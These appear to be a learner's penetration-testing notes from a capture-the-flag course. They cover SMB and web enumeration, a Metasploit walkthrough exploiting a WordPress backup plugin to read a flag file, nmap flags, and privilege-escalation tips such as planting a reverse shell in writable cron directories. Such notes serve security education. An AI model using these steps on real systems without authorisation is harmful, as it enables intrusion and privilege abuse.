## SMB shares

To connect to a SMB share over a network as the user Bob
```
smbclient -U bob \\\\10.129.74.37\\users
```
To just look at the users on the network, use this command
```
smbclient -N -L \\\*ip-adress*
```

# Web Enumeration

## Se any hidden files or directories on a webserver that is not intended for public access. 

Tools: 

https://github.com/ffuf/ffuf

https://github.com/OJ/gobuster

## HTTP status codes

https://en.wikipedia.org/wiki/List_of_HTTP_status_codes

## DNS Subdomain Enumeration

Contains many useful lists for fuzzing and exploitation: https://github.com/danielmiessler/SecLists

Take screenshots of target web applications, fingerprint them, and indentify possible default credentials: https://github.com/FortyNorthSecurity/EyeWitness

## Video to help

https://www.youtube.com/watch?v=6Ekm0hXfvME

## First hack with Metasploit

Q: Try to identify the services running on the server above, and then try to search to find public exploits to exploit them. Once you do, try to get the content of the '/flag.txt' file. (note: the web server may take a few seconds to start)

I first open up the target in my browser to see what we are working with. I meet a webpage displaying the text "Simple Backup Plugin 2.7.10 for WordPress".

I search up "simple backup" on Metasploit to see if I get any hits on it. The rest I will show is the commands to this hack.
<br>

```
msf6 > search simple backup
```
<br>

```
msf6 > use 0
```
<br>

```
msf6 > options
```
<br>

```
msf6 > set RHOST *ip-adress
```
<br>

```
msf6 > set RPORT *port
```
<br>

*this is because the question is asking us to try and get the content of the /flag.txt
```
msf6 > set FILEPATH /flag.txt
```
<br>

```
msf6 > run
```
<br>


```
cd /home/kali/.msf4/loot
```
<br>

```
ls
```
<br>


```
cat *file that you have displayed with the ls command
```
<br>

And there you have your flag. Your first hack


## Useful nmap commands list

---

Nmap dash list

-sV = Version scan

-sC = Specify Nmap scripts

-p- = Scans all 65,535 TCP ports

-sV --script=banner = Banner grabbing

---
<br>

To learn more about nmap: https://academy.hackthebox.com/module/details/19

---

## Privilege Ecalation

### PrivEsc Checklists

Checklists for Linux and Windows, but contains more info: https://book.hacktricks.xyz/welcome/readme

Also a checklist: https://github.com/swisskyrepo/PayloadsAllTheThings

 ### Enumeration Scripts
 
 Linux enumeration scripts: https://github.com/rebootuser/LinEnum
 
 Linux Privilege Escalation Check Script: https://github.com/sleventyeleven/linuxprivchecker
 
 For windows: https://github.com/GhostPack/Seatbelt
 
 https://github.com/411Hall/JAWS
 
 ### Kernel Exploits
 
 If you find any service running and old operation system, we should start by looking for potential kernel vulnerabilities that may exist. To search up older versions for vulnerabilities we use ```searchsploit```
 
 ### Vulnerable Software
 
 We need to check what runs on the system. In linux we do this with running ```dpkg -l``` and on Windows we look at C:\Program Files to check what software that is installed on the system. Then just look for older versions that are in use, and search for vulnerabilities. 
 
 ### User Privileges
 
 ```sudo -l``` to see what sudo privileges we have.
 
 List of commands on how they can explited through sudo: https://gtfobins.github.io/
 
 Contains a list of Windows applications which we may be able to leverage to perform certain functions, like downloading files or executing commands in the context of a privileged user: https://lolbas-project.github.io/#
 
 ### Schedueled tasks
 
There are usually two ways to take advantage of scheduled tasks (Windows) or cron jobs (Linux) to escalate our privileges:

 1. Add new scheduled tasks/cron jobs
 2. Trick them to execute a malicious software

The easiest way is to check if we are allowed to add new scheduled tasks. In Linux, a common form of maintaining scheduled tasks is through Cron Jobs. There are specific directories that we may be able to utilize to add new cron jobs if we have the write permissions over them. These include:

/etc/crontab
/etc/cron.d
/var/spool/cron/crontabs/root

If we can write to a directory called by a cron job, we can write a bash script with a reverse shell command, which should send us a reverse shell when executed.

### Q

sudo -u user2 /bin/bash 

This is to gain access to the flag.


